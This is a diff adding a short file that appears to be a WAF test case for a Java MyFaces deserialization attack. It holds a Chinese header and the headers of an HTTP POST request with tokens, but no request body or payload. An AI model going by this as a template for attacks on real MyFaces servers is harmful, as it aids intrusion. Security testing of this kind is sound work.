@@ -1,0 +1,10 @@
+# 反序列化-JAVA Myfaces2
+# MyFaces是一个开源的、用于构建JavaServer Faces (JSF) 应用的框架。JSF是一种用于构建用户界面的标准Java框架,在Java企业级开发中被广泛应用。
+POST /?acid=80001762&bid=hd_tag_m8mv25od HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25od
+RM-PRO-Token: 345b54436ce6865949f606515261cadc
+RM-PRO-Time: 1742808492177
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=GOOz1COK7bOV6UZVvGOzEgz7xJpCvgIM
+
